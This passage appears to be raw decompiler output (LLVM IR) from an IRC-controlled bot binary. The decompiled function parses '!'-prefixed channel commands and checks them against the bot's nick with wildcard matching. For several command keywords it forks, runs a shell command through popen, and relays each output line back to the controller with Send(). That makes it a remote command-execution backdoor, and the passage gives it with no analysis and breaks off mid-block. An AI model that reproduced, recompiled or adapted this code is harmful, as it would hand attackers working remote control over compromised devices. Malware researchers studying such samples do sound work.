  %v0_10010d5c = load i32, i32* %r29.global-to-local, align 4
  %v2_10010d5c = icmp ult i32 %v0_10010d5c, %v0_10010d54
  br i1 %v2_10010d5c, label %dec_label_pc_10010d64, label %dec_label_pc_10010d84

dec_label_pc_10010d64:                            ; preds = %dec_label_pc_10010cfc, %dec_label_pc_10010d40
  %storemerge9103 = phi i32 [ %v1_10010d44, %dec_label_pc_10010d40 ], [ 0, %dec_label_pc_10010cfc ]
  %v2_10010d70 = add i32 %storemerge9103, %arg2
  %v1_10010d74 = inttoptr i32 %v2_10010d70 to i8*
  %v2_10010d74 = load i8, i8* %v1_10010d74, align 1
  %v3_10010d7c = icmp eq i8 %v2_10010d74, 33
  br i1 %v3_10010d7c, label %dec_label_pc_10010d84, label %dec_label_pc_10010d40

dec_label_pc_10010d84:                            ; preds = %dec_label_pc_10010d40, %dec_label_pc_10010d64, %dec_label_pc_10010cfc
  %storemerge9.lcssa = phi i32 [ 0, %dec_label_pc_10010cfc ], [ %v1_10010d44, %dec_label_pc_10010d40 ], [ %storemerge9103, %dec_label_pc_10010d64 ]
  %v2_10010d90 = add i32 %storemerge9.lcssa, %arg2
  %v3_10010d98 = inttoptr i32 %v2_10010d90 to i8*
  store i8 0, i8* %v3_10010d98, align 1
  %v2_10010da0 = load i8, i8* %v5_10010d30, align 1
  %v3_10010da8 = icmp eq i8 %v2_10010da0, 33
  br i1 %v3_10010da8, label %dec_label_pc_10010db0, label %dec_label_pc_10011c60

dec_label_pc_10010db0:                            ; preds = %dec_label_pc_10010d84
  %v3_10010db4 = load i32, i32* @global_var_100451a4.544, align 4
  store i32 %arg3, i32* @r3, align 4
  store i32 %v3_10010db4, i32* @r4, align 4
  %v2_10010dc0 = call i32 @__GI_strcasecmp(i32 %arg3, i32 %v3_10010db4)
  store i32 %v2_10010dc0, i32* %r3.global-to-local, align 4
  %v3_10010dc8 = icmp eq i32 %v2_10010dc0, 0
  br i1 %v3_10010dc8, label %dec_label_pc_10010dd0, label %dec_label_pc_10011c60

dec_label_pc_10010dd0:                            ; preds = %dec_label_pc_10010db0
  %v2_10010dd0 = ptrtoint i32* %stack_var_-2092 to i32
  store i32 %v2_10010dd0, i32* @r3, align 4
  store i32 0, i32* @r4, align 4
  store i32 1024, i32* @r5, align 4
  store i32 ptrtoint (i32* @global_var_10010de8.871 to i32), i32* @lr, align 4
  %v0_10010de4 = call i32 @__GI_memset()
  %v1_10010df4 = add i32 %v2_10010d08, 3
  %v5_10010df8 = inttoptr i32 %v1_10010df4 to i8*
  store i32 0, i32* %r29.global-to-local, align 4
  store i32 %v1_10010df4, i32* @r3, align 4
  %v0_10010e1c90 = call i32 @__GI_strlen()
  store i32 %v0_10010e1c90, i32* %r3.global-to-local, align 4
  %v0_10010e2491 = load i32, i32* %r29.global-to-local, align 4
  %v2_10010e2492 = icmp ult i32 %v0_10010e2491, %v0_10010e1c90
  br i1 %v2_10010e2492, label %dec_label_pc_10010e2c, label %dec_label_pc_10010e4c

dec_label_pc_10010e08:                            ; preds = %dec_label_pc_10010e2c
  %v1_10010e0c = add i32 %storemerge1095, 1
  store i32 %v1_10010e0c, i32* %r29.global-to-local, align 4
  store i32 %v1_10010df4, i32* @r3, align 4
  %v0_10010e1c = call i32 @__GI_strlen()
  store i32 %v0_10010e1c, i32* %r3.global-to-local, align 4
  %v0_10010e24 = load i32, i32* %r29.global-to-local, align 4
  %v2_10010e24 = icmp ult i32 %v0_10010e24, %v0_10010e1c
  br i1 %v2_10010e24, label %dec_label_pc_10010e2c, label %dec_label_pc_10010e4c

dec_label_pc_10010e2c:                            ; preds = %dec_label_pc_10010dd0, %dec_label_pc_10010e08
  %storemerge1095 = phi i32 [ %v1_10010e0c, %dec_label_pc_10010e08 ], [ 0, %dec_label_pc_10010dd0 ]
  %v2_10010e38 = add i32 %storemerge1095, %v1_10010df4
  %v1_10010e3c = inttoptr i32 %v2_10010e38 to i8*
  %v2_10010e3c = load i8, i8* %v1_10010e3c, align 1
  %v3_10010e44 = icmp eq i8 %v2_10010e3c, 32
  br i1 %v3_10010e44, label %dec_label_pc_10010e4c, label %dec_label_pc_10010e08

dec_label_pc_10010e4c:                            ; preds = %dec_label_pc_10010e08, %dec_label_pc_10010e2c, %dec_label_pc_10010dd0
  %storemerge10.lcssa = phi i32 [ 0, %dec_label_pc_10010dd0 ], [ %v1_10010e0c, %dec_label_pc_10010e08 ], [ %storemerge1095, %dec_label_pc_10010e2c ]
  %v2_10010e58 = add i32 %storemerge10.lcssa, %v1_10010df4
  %v3_10010e60 = inttoptr i32 %v2_10010e58 to i8*
  store i8 0, i8* %v3_10010e60, align 1
  %v3_10010e68 = load i32, i32* @global_var_10045178.64, align 4
  store i32 %v1_10010df4, i32* %r3.global-to-local, align 4
  store i32 268504696, i32* @lr, align 4
  %v4_10010e74 = call i32 @strwildmatch(i8* %v5_10010df8, i32 %v3_10010e68, i32 268697600)
  store i32 %v4_10010e74, i32* %r3.global-to-local, align 4
  %v3_10010e7c = icmp eq i32 %v4_10010e74, 0
  br i1 %v3_10010e7c, label %dec_label_pc_10010e84, label %dec_label_pc_10011c60

dec_label_pc_10010e84:                            ; preds = %dec_label_pc_10010e4c
  %v1_10010e90 = add i32 %v2_10010e58, 1
  %v5_10010e94 = inttoptr i32 %v1_10010e90 to i8*
  store i32 %v1_10010e90, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_1002d43c.872 to i32), i32* @r4, align 4
  %v5_10010ea8 = call i32 @__GI_strncmp(i8* %v5_10010e94, i32 ptrtoint ([5 x i8]* @global_var_1002d43c.872 to i32), i32 4)
  store i32 %v5_10010ea8, i32* %r3.global-to-local, align 4
  %v3_10010eb0 = icmp eq i32 %v5_10010ea8, 0
  br i1 %v3_10010eb0, label %dec_label_pc_10010eb8, label %dec_label_pc_10010f08

dec_label_pc_10010eb8:                            ; preds = %dec_label_pc_10010e84
  %v3_10010ebc = load i8, i8* @global_var_10045150.22, align 1
  %v3_10010ec4 = icmp eq i8 %v3_10010ebc, 0
  br i1 %v3_10010ec4, label %dec_label_pc_10010ee8, label %dec_label_pc_10010ecc

dec_label_pc_10010ecc:                            ; preds = %dec_label_pc_10010eb8
  store i32 %arg1, i32* %r3.global-to-local, align 4
  %v6_10010ee0 = call i32 @Send(i32 %arg1, i32 ptrtoint ([30 x i8]* @global_var_1002a05c.24 to i32), i32 %arg2, i32 ptrtoint ([13 x i8]* @global_var_10030000.14 to i32))
  store i32 %v6_10010ee0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10010f08

dec_label_pc_10010ee8:                            ; preds = %dec_label_pc_10010eb8
  %v1_10010eec = add i32 %v2_10010e58, 5
  store i32 %arg1, i32* %r3.global-to-local, align 4
  %v6_10010f04 = call i32 @Send(i32 %arg1, i32 ptrtoint ([4 x i8]* @global_var_1002d444.874 to i32), i32 %v1_10010eec, i32 ptrtoint ([13 x i8]* @global_var_10030000.14 to i32))
  store i32 %v6_10010f04, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10010f08

dec_label_pc_10010f08:                            ; preds = %dec_label_pc_10010e84, %dec_label_pc_10010ecc, %dec_label_pc_10010ee8
  store i32 %v1_10010e90, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_1002d448.875 to i32), i32* @r4, align 4
  %v5_10010f18 = call i32 @__GI_strncmp(i8* %v5_10010e94, i32 ptrtoint ([4 x i8]* @global_var_1002d448.875 to i32), i32 3)
  store i32 %v5_10010f18, i32* %r3.global-to-local, align 4
  %v3_10010f20 = icmp eq i32 %v5_10010f18, 0
  br i1 %v3_10010f20, label %dec_label_pc_10010f28, label %dec_label_pc_10011008

dec_label_pc_10010f28:                            ; preds = %dec_label_pc_10010f08
  store i32 %arg2, i32* %r3.global-to-local, align 4
  %v1_10010f2c = call i32 @mfork(i32 %arg2)
  store i32 %v1_10010f2c, i32* %r3.global-to-local, align 4
  %v3_10010f34 = icmp eq i32 %v1_10010f2c, 0
  br i1 %v3_10010f34, label %dec_label_pc_10010f3c, label %dec_label_pc_10011c60

dec_label_pc_10010f3c:                            ; preds = %dec_label_pc_10010f28
  %v2_10010f3c = ptrtoint i32* %stack_var_-1068 to i32
  store i32 %v2_10010f3c, i32* @r3, align 4
  store i32 0, i32* @r4, align 4
  store i32 1024, i32* @r5, align 4
  store i32 268504912, i32* @lr, align 4
  %v0_10010f4c = call i32 @__GI_memset()
  store i32 %v2_10010f3c, i32* @r3, align 4
  store i32 268504948, i32* @lr, align 4
  %v1_10010f70 = call i32 @sprintf(i32 %v2_10010f3c)
  store i32 %v2_10010f3c, i32* %r3.global-to-local, align 4
  store i32 268504968, i32* @lr, align 4
  %v5_10010f84 = call i32 @popen(i32 %v2_10010f3c, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @global_var_1002a6e0.110, i32 0, i32 0), i32 ptrtoint ([13 x i8]* @global_var_10030000.14 to i32))
  store i32 %v5_10010f84, i32* %r3.global-to-local, align 4
  store i32 268505068, i32* @lr, align 4
  %v1_10010fe886 = call i32 @feof(i32 %v5_10010f84)
  store i32 %v1_10010fe886, i32* %r3.global-to-local, align 4
  %v3_10010ff089 = icmp eq i32 %v1_10010fe886, 0
  br i1 %v3_10010ff089, label %dec_label_pc_10010f94, label %dec_label_pc_10010ff8

dec_label_pc_10010f94:                            ; preds = %dec_label_pc_10010f3c, %dec_label_pc_10010f94
  store i32 %v2_10010f3c, i32* @r3, align 4
  store i32 0, i32* @r4, align 4
  store i32 1024, i32* @r5, align 4
  store i32 268505000, i32* @lr, align 4
  %v0_10010fa4 = call i32 @__GI_memset()
  store i32 %v2_10010f3c, i32* %r3.global-to-local, align 4
  store i32 268505020, i32* @lr, align 4
  %v3_10010fb8 = call i32 @fgets(i32 %v2_10010f3c, i32 1024, i32 %v5_10010f84)
  store i32 %arg1, i32* %r3.global-to-local, align 4
  %v6_10010fd8 = call i32 @Send(i32 %arg1, i32 ptrtoint ([15 x i8]* @global_var_1002d494.877 to i32), i32 %arg2, i32 %v2_10010f3c)
  store i32 1, i32* %r3.global-to-local, align 4
  store i32 268505060, i32* @lr, align 4
  %v1_10010fe0 = call i32 @sleep(i32 1)
  store i32 %v5_10010f84, i32* %r3.global-to-local, align 4
  store i32 268505068, i32* @lr, align 4
  %v1_10010fe8 = call i32 @feof(i32 %v5_10010f84)
  store i32 %v1_10010fe8, i32* %r3.global-to-local, align 4
  %v3_10010ff0 = icmp eq i32 %v1_10010fe8, 0
  br i1 %v3_10010ff0, label %dec_label_pc_10010f94, label %dec_label_pc_10010ff8

dec_label_pc_10010ff8:                            ; preds = %dec_label_pc_10010f94, %dec_label_pc_10010f3c
  store i32 %v5_10010f84, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_10011000.879 to i32), i32* @lr, align 4
  %v1_10010ffc = call i32 @pclose(i32 %v5_10010f84)
  %v0_10011004 = call i32 @__GI_exit()
  store i32 %v0_10011004, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10011008

dec_label_pc_10011008:                            ; preds = %dec_label_pc_10010f08, %dec_label_pc_10010ff8
  store i32 %v1_10010e90, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_1002d4a4.880 to i32), i32* @r4, align 4
  %v5_10011018 = call i32 @__GI_strncmp(i8* %v5_10010e94, i32 ptrtoint ([5 x i8]* @global_var_1002d4a4.880 to i32), i32 4)
  store i32 %v5_10011018, i32* %r3.global-to-local, align 4
  %v3_10011020 = icmp eq i32 %v5_10011018, 0
  br i1 %v3_10011020, label %dec_label_pc_10011028, label %dec_label_pc_10011108

dec_label_pc_10011028:                            ; preds = %dec_label_pc_10011008
  store i32 %arg2, i32* %r3.global-to-local, align 4
  %v1_1001102c = call i32 @mfork(i32 %arg2)
  store i32 %v1_1001102c, i32* %r3.global-to-local, align 4
  %v3_10011034 = icmp eq i32 %v1_1001102c, 0
  br i1 %v3_10011034, label %dec_label_pc_1001103c, label %dec_label_pc_10011c60

dec_label_pc_1001103c:                            ; preds = %dec_label_pc_10011028
  %v2_1001103c = ptrtoint i32* %stack_var_-1068 to i32
  store i32 %v2_1001103c, i32* @r3, align 4
  store i32 0, i32* @r4, align 4
  store i32 1024, i32* @r5, align 4
  store i32 268505168, i32* @lr, align 4
  %v0_1001104c = call i32 @__GI_memset()
  store i32 %v2_1001103c, i32* @r3, align 4
  store i32 268505204, i32* @lr, align 4
  %v1_10011070 = call i32 @sprintf(i32 %v2_1001103c)
  store i32 %v2_1001103c, i32* %r3.global-to-local, align 4
  store i32 268505224, i32* @lr, align 4
  %v5_10011084 = call i32 @popen(i32 %v2_1001103c, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @global_var_1002a6e0.110, i32 0, i32 0), i32 ptrtoint ([13 x i8]* @global_var_10030000.14 to i32))
  store i32 %v5_10011084, i32* %r3.global-to-local, align 4
  store i32 268505324, i32* @lr, align 4
  %v1_100110e882 = call i32 @feof(i32 %v5_10011084)
  store i32 %v1_100110e882, i32* %r3.global-to-local, align 4
  %v3_100110f085 = icmp eq i32 %v1_100110e882, 0
  br i1 %v3_100110f085, label %dec_label_pc_10011094, label %dec_label_pc_100110f8

dec_label_pc_10011094:                            ; preds = %dec_label_pc_1001103c, %dec_label_pc_10011094
  store i32 %v2_1001103c, i32* @r3, align 4
  store i32 0, i32* @r4, align 4
  store i32 1024, i32* @r5, align 4
  store i32 268505256, i32* @lr, align 4
  %v0_100110a4 = call i32 @__GI_memset()
  store i32 %v2_1001103c, i32* %r3.global-to-local, align 4
  store i32 268505276, i32* @lr, align 4
  %v3_100110b8 = call i32 @fgets(i32 %v2_1001103c, i32 1024, i32 %v5_10011084)
  store i32 %arg1, i32* %r3.global-to-local, align 4
  %v6_100110d8 = call i32 @Send(i32 %arg1, i32 ptrtoint ([15 x i8]* @global_var_1002d494.877 to i32), i32 %arg2, i32 %v2_1001103c)
  store i32 1, i32* %r3.global-to-local, align 4
  store i32 268505316, i32* @lr, align 4
  %v1_100110e0 = call i32 @sleep(i32 1)
  store i32 %v5_10011084, i32* %r3.global-to-local, align 4
  store i32 268505324, i32* @lr, align 4
  %v1_100110e8 = call i32 @feof(i32 %v5_10011084)
  store i32 %v1_100110e8, i32* %r3.global-to-local, align 4
  %v3_100110f0 = icmp eq i32 %v1_100110e8, 0
  br i1 %v3_100110f0, label %dec_label_pc_10011094, label %dec_label_pc_100110f8

dec_label_pc_100110f8:                            ; preds = %dec_label_pc_10011094, %dec_label_pc_1001103c
  store i32 %v5_10011084, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_10011100.883 to i32), i32* @lr, align 4
  %v1_100110fc = call i32 @pclose(i32 %v5_10011084)
  %v0_10011104 = call i32 @__GI_exit()
  store i32 %v0_10011104, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10011108

dec_label_pc_10011108:                            ; preds = %dec_label_pc_10011008, %dec_label_pc_100110f8
  store i32 %v1_10010e90, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_1002d510.884 to i32), i32* @r4, align 4
  %v5_10011118 = call i32 @__GI_strncmp(i8* %v5_10010e94, i32 ptrtoint ([7 x i8]* @global_var_1002d510.884 to i32), i32 6)
  store i32 %v5_10011118, i32* %r3.global-to-local, align 4
  %v3_10011120 = icmp eq i32 %v5_10011118, 0
  br i1 %v3_10011120, label %dec_label_pc_10011128, label %dec_label_pc_10011208

dec_label_pc_10011128:                            ; preds = %dec_label_pc_10011108
  store i32 %arg2, i32* %r3.global-to-local, align 4
  %v1_1001112c = call i32 @mfork(i32 %arg2)
  store i32 %v1_1001112c, i32* %r3.global-to-local, align 4
  %v3_10011134 = icmp eq i32 %v1_1001112c, 0
  br i1 %v3_10011134, label %dec_label_pc_1001113c, label %dec_label_pc_10011c60

dec_label_pc_1001113c:                            ; preds = %dec_label_pc_10011128
  %v2_1001113c = ptrtoint i32* %stack_var_-1068 to i32
  store i32 %v2_1001113c, i32* @r3, align 4
  store i32 0, i32* @r4, align 4
  store i32 1024, i32* @r5, align 4
  store i32 268505424, i32* @lr, align 4
  %v0_1001114c = call i32 @__GI_memset()
  store i32 %v2_1001113c, i32* @r3, align 4
  store i32 268505460, i32* @lr, align 4
  %v1_10011170 = call i32 @sprintf(i32 %v2_1001113c)
  store i32 %v2_1001113c, i32* %r3.global-to-local, align 4
  store i32 268505480, i32* @lr, align 4
  %v5_10011184 = call i32 @popen(i32 %v2_1001113c, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @global_var_1002a6e0.110, i32 0, i32 0), i32 ptrtoint ([13 x i8]* @global_var_10030000.14 to i32))
  store i32 %v5_10011184, i32* %r3.global-to-local, align 4
  store i32 268505580, i32* @lr, align 4
  %v1_100111e878 = call i32 @feof(i32 %v5_10011184)
  store i32 %v1_100111e878, i32* %r3.global-to-local, align 4
  %v3_100111f081 = icmp eq i32 %v1_100111e878, 0
  br i1 %v3_100111f081, label %dec_label_pc_10011194, label %dec_label_pc_100111f8

dec_label_pc_10011194:                            ; preds = %dec_label_pc_1001113c, %dec_label_pc_10011194
  store i32 %v2_1001113c, i32* @r3, align 4
  store i32 0, i32* @r4, align 4
  store i32 1024, i32* @r5, align 4
  store i32 268505512, i32* @lr, align 4
  %v0_100111a4 = call i32 @__GI_memset()
  store i32 %v2_1001113c, i32* %r3.global-to-local, align 4
  store i32 268505532, i32* @lr, align 4
  %v3_100111b8 = call i32 @fgets(i32 %v2_1001113c, i32 1024, i32 %v5_10011184)
  store i32 %arg1, i32* %r3.global-to-local, align 4
  %v6_100111d8 = call i32 @Send(i32 %arg1, i32 ptrtoint ([15 x i8]* @global_var_1002d494.877 to i32), i32 %arg2, i32 %v2_1001113c)
  store i32 1, i32* %r3.global-to-local, align 4
  store i32 268505572, i32* @lr, align 4
  %v1_100111e0 = call i32 @sleep(i32 1)
  store i32 %v5_10011184, i32* %r3.global-to-local, align 4
  store i32 268505580, i32* @lr, align 4
  %v1_100111e8 = call i32 @feof(i32 %v5_10011184)
  store i32 %v1_100111e8, i32* %r3.global-to-local, align 4
  %v3_100111f0 = icmp eq i32 %v1_100111e8, 0
  br i1 %v3_100111f0, label %dec_label_pc_10011194, label %dec_label_pc_100111f8

dec_label_pc_100111f8:                            ; preds = %dec_label_pc_10011194, %dec_label_pc_1001113c
  store i32 %v5_10011184, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_10011200.887 to i32), i32* @lr, align 4
  %v1_100111fc = call i32 @pclose(i32 %v5_10011184)
  %v0_10011204 = call i32 @__GI_exit()
  store i32 %v0_10011204, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10011208

dec_label_pc_10011208:                            ; preds = %dec_label_pc_10011108, %dec_label_pc_100111f8
  store i32 %v1_10010e90, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([8 x i8]* @global_var_1002d664.888 to i32), i32* @r4, align 4
  %v5_10011218 = call i32 @__GI_strncmp(i8* %v5_10010e94, i32 ptrtoint ([8 x i8]* @global_var_1002d664.888 to i32), i32 7)
  store i32 %v5_10011218, i32* %r3.global-to-local, align 4
  %v3_10011220 = icmp eq i32 %v5_10011218, 0
  br i1 %v3_10011220, label %dec_label_pc_10011228, label %dec_label_pc_10011308

dec_label_pc_10011228:                            ; preds = %dec_label_pc_10011208
  store i32 %arg2, i32* %r3.global-to-local, align 4
  %v1_1001122c = call i32 @mfork(i32 %arg2)
  store i32 %v1_1001122c, i32* %r3.global-to-local, align 4
  %v3_10011234 = icmp eq i32 %v1_1001122c, 0
  br i1 %v3_10011234, label %dec_label_pc_1001123c, label %dec_label_pc_10011c60

dec_label_pc_1001123c:                            ; preds = %dec_label_pc_10011228
  %v2_1001123c = ptrtoint i32* %stack_var_-1068 to i32
  store i32 %v2_1001123c, i32* @r3, align 4
  store i32 0, i32* @r4, align 4
  store i32 1024, i32* @r5, align 4
  store i32 268505680, i32* @lr, align 4
  %v0_1001124c = call i32 @__GI_memset()
  store i32 %v2_1001123c, i32* @r3, align 4
  store i32 268505716, i32* @lr, align 4
  %v1_10011270 = call i32 @sprintf(i32 %v2_1001123c)
  store i32 %v2_1001123c, i32* %r3.global-to-local, align 4
  store i32 268505736, i32* @lr, align 4
  %v5_10011284 = call i32 @popen(i32 %v2_1001123c, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @global_var_1002a6e0.110, i32 0, i32 0), i32 ptrtoint ([13 x i8]* @global_var_10030000.14 to i32))
  store i32 %v5_10011284, i32* %r3.global-to-local, align 4
  store i32 268505836, i32* @lr, align 4
  %v1_100112e874 = call i32 @feof(i32 %v5_10011284)
  store i32 %v1_100112e874, i32* %r3.global-to-local, align 4
  %v3_100112f077 = icmp eq i32 %v1_100112e874, 0
  br i1 %v3_100112f077, label %dec_label_pc_10011294, label %dec_label_pc_100112f8

dec_label_pc_10011294:                            ; preds = %dec_label_pc_1001123c, %dec_label_pc_10011294
  store i32 %v2_1001123c, i32* @r3, align 4
  store i32 0, i32* @r4, align 4
  store i32 1024, i32* @r5, align 4
  store i32 268505768, i32* @lr, align 4
  %v0_100112a4 = call i32 @__GI_memset()
  store i32 %v2_1001123c, i32* %r3.global-to-local, align 4
  store i32 268505788, i32* @lr, align 4
  %v3_100112b8 = call i32 @fgets(i32 %v2_1001123c, i32 1024, i32 %v5_10011284)
  store i32 %arg1, i32* %r3.global-to-local, align 4
  %v6_100112d8 = call i32 @Send(i32 %arg1, i32 ptrtoint ([15 x i8]* @global_var_1002d494.877 to i32), i32 %arg2, i32 %v2_1001123c)
  store i32 1, i32* %r3.global-to-local, align 4
  store i32 268505828, i32* @lr, align 4
  %v1_100112e0 = call i32 @sleep(i32 1)
  store i32 %v5_10011284, i32* %r3.global-to-local, align 4
  store i32 268505836, i32* @lr, align 4
  %v1_100112e8 = call i32 @feof(i32 %v5_10011284)
  store i32 %v1_100112e8, i32* %r3.global-to-local, align 4
  %v3_100112f0 = icmp eq i32 %v1_100112e8, 0
  br i1 %v3_100112f0, label %dec_label_pc_10011294, label %dec_label_pc_100112f8

dec_label_pc_100112f8:                            ; preds = %dec_label_pc_10011294, %dec_label_pc_1001123c
  store i32 %v5_10011284, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_10011300.891 to i32), i32* @lr, align 4
  %v1_100112fc = call i32 @pclose(i32 %v5_10011284)
  %v0_10011304 = call i32 @__GI_exit()
  store i32 %v0_10011304, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10011308

dec_label_pc_10011308:                            ; preds = %dec_label_pc_10011208, %dec_label_pc_100112f8
  store i32 %v1_10010e90, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([9 x i8]* @global_var_1002d908.892 to i32), i32* @r4, align 4
  %v5_10011318 = call i32 @__GI_strncmp(i8* %v5_10010e94, i32 ptrtoint ([9 x i8]* @global_var_1002d908.892 to i32), i32 8)
  store i32 %v5_10011318, i32* %r3.global-to-local, align 4
  %v3_10011320 = icmp eq i32 %v5_10011318, 0
  br i1 %v3_10011320, label %dec_label_pc_10011328, label %dec_label_pc_10011408

dec_label_pc_10011328:                            ; preds = %dec_label_pc_10011308
  store i32 %arg2, i32* %r3.global-to-local, align 4
  %v1_1001132c = call i32 @mfork(i32 %arg2)
  store i32 %v1_1001132c, i32* %r3.global-to-local, align 4
  %v3_10011334 = icmp eq i32 %v1_1001132c, 0
  br i1 %v3_10011334, label %dec_label_pc_1001133c, label %dec_label_pc_10011c60

dec_label_pc_1001133c:                            ; preds = %dec_label_pc_10011328
  %v2_1001133c = ptrtoint i32* %stack_var_-1068 to i32
  store i32 %v2_1001133c, i32* @r3, align 4
  store i32 0, i32* @r4, align 4
  store i32 1024, i32* @r5, align 4
  store i32 268505936, i32* @lr, align 4
  %v0_1001134c = call i32 @__GI_memset()
  store i32 %v2_1001133c, i32* @r3, align 4
  store i32 268505972, i32* @lr, align 4
  %v1_10011370 = call i32 @sprintf(i32 %v2_1001133c)
  store i32 %v2_1001133c, i32* %r3.global-to-local, align 4
  store i32 268505992, i32* @lr, align 4
  %v5_10011384 = call i32 @popen(i32 %v2_1001133c, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @global_var_1002a6e0.110, i32 0, i32 0), i32 ptrtoint ([13 x i8]* @global_var_10030000.14 to i32))
  store i32 %v5_10011384, i32* %r3.global-to-local, align 4
  store i32 268506092, i32* @lr, align 4
  %v1_100113e870 = call i32 @feof(i32 %v5_10011384)
  store i32 %v1_100113e870, i32* %r3.global-to-local, align 4
  %v3_100113f073 = icmp eq i32 %v1_100113e870, 0
  br i1 %v3_100113f073, label %dec_label_pc_10011394, label %dec_label_pc_100113f8

dec_label_pc_10011394:                            ; preds = %dec_label_pc_1001133c, %dec_label_pc_10011394
  store i32 %v2_1001133c, i32* @r3, align 4
  store i32 0, i32* @r4, align 4
  store i32 1024, i32* @r5, align 4
  store i32 268506024, i32* @lr, align 4
  %v0_100113a4 = call i32 @__GI_memset()
  store i32 %v2_1001133c, i32* %r3.global-to-local, align 4
  store i32 268506044, i32* @lr, align 4
  %v3_100113b8 = call i32 @fgets(i32 %v2_1001133c, i32 1024, i32 %v5_10011384)
  store i32 %arg1, i32* %r3.global-to-local, align 4
  %v6_100113d8 = call i32 @Send(i32 %arg1, i32 ptrtoint ([15 x i8]* @global_var_1002d494.877 to i32), i32 %arg2, i32 %v2_1001133c)
  store i32 1, i32* %r3.global-to-local, align 4
  store i32 268506084, i32* @lr, align 4
  %v1_100113e0 = call i32 @sleep(i32 1)
  store i32 %v5_10011384, i32* %r3.global-to-local, align 4
  store i32 268506092, i32* @lr, align 4
  %v1_100113e8 = call i32 @feof(i32 %v5_10011384)
  store i32 %v1_100113e8, i32* %r3.global-to-local, align 4
  %v3_100113f0 = icmp eq i32 %v1_100113e8, 0
  br i1 %v3_100113f0, label %dec_label_pc_10011394, label %dec_label_pc_100113f8

dec_label_pc_100113f8:                            ; preds = %dec_label_pc_10011394, %dec_label_pc_1001133c
  store i32 %v5_10011384, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_10011400.895 to i32), i32* @lr, align 4
  %v1_100113fc = call i32 @pclose(i32 %v5_10011384)
  %v0_10011404 = call i32 @__GI_exit()
  store i32 %v0_10011404, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10011408

dec_label_pc_10011408:                            ; preds = %dec_label_pc_10011308, %dec_label_pc_100113f8
  store i32 %v1_10010e90, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([11 x i8]* @global_var_1002da9c.896 to i32), i32* @r4, align 4
  %v5_10011418 = call i32 @__GI_strncmp(i8* %v5_10010e94, i32 ptrtoint ([11 x i8]* @global_var_1002da9c.896 to i32), i32 10)
  store i32 %v5_10011418, i32* %r3.global-to-local, align 4
  %v3_10011420 = icmp eq i32 %v5_10011418, 0
  br i1 %v3_10011420, label %dec_label_pc_10011428, label %dec_label_pc_10011508

dec_label_pc_10011428:                            ; preds = %dec_label_pc_10011408
  store i32 %arg2, i32* %r3.global-to-local, align 4
  %v1_1001142c = call i32 @mfork(i32 %arg2)
  store i32 %v1_1001142c, i32* %r3.global-to-local, align 4
  %v3_10011434 = icmp eq i32 %v1_1001142c, 0
  br i1 %v3_10011434, label %dec_label_pc_1001143c, label %dec_label_pc_10011c60

dec_label_pc_1001143c:                            ; preds = %dec_label_pc_10011428
  %v2_1001143c = ptrtoint i32* %stack_var_-1068 to i32
  store i32 %v2_1001143c, i32* @r3, align 4
  store i32 0, i32* @r4, align 4
  store i32 1024, i32* @r5, align 4
  store i32 268506192, i32* @lr, align 4
  %v0_1001144c = call i32 @__GI_memset()
  store i32 %v2_1001143c, i32* @r3, align 4
  store i32 268506228, i32* @lr, align 4
  %v1_10011470 = call i32 @sprintf(i32 %v2_1001143c)
  store i32 %v2_1001143c, i32* %r3.global-to-local, align 4
  store i32 268506248, i32* @lr, align 4
  %v5_10011484 = call i32 @popen(i32 %v2_1001143c, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @global_var_1002a6e0.110, i32 0, i32 0), i32 ptrtoint ([13 x i8]* @global_var_10030000.14 to i32))
  store i32 %v5_10011484, i32* %r3.global-to-local, align 4
  store i32 268506348, i32* @lr, align 4
  %v1_100114e866 = call i32 @feof(i32 %v5_10011484)
  store i32 %v1_100114e866, i32* %r3.global-to-local, align 4
  %v3_100114f069 = icmp eq i32 %v1_100114e866, 0
  br i1 %v3_100114f069, label %dec_label_pc_10011494, label %dec_label_pc_100114f8

dec_label_pc_10011494:                            ; preds = %dec_label_pc_1001143c, %dec_label_pc_10011494
  store i32 %v2_1001143c, i32* @r3, align 4
  store i32 0, i32* @r4, align 4
  store i32 1024, i32* @r5, align 4
  store i32 268506280, i32* @lr, align 4
  %v0_100114a4 = call i32 @__GI_memset()
  store i32 %v2_1001143c, i32* %r3.global-to-local, align 4
  store i32 268506300, i32* @lr, align 4
  %v3_100114b8 = call i32 @fgets(i32 %v2_1001143c, i32 1024, i32 %v5_10011484)
  store i32 %arg1, i32* %r3.global-to-local, align 4
  %v6_100114d8 = call i32 @Send(i32 %arg1, i32 ptrtoint ([15 x i8]* @global_var_1002d494.877 to i32), i32 %arg2, i32 %v2_1001143c)
  store i32 1, i32* %r3.global-to-local, align 4
  store i32 268506340, i32* @lr, align 4
  %v1_100114e0 = call i32 @sleep(i32 1)
  store i32 %v5_10011484, i32* %r3.global-to-local, align 4
  store i32 268506348, i32* @lr, align 4
  %v1_100114e8 = call i32 @feof(i32 %v5_10011484)
  store i32 %v1_100114e8, i32* %r3.global-to-local, align 4
  %v3_100114f0 = icmp eq i32 %v1_100114e8, 0
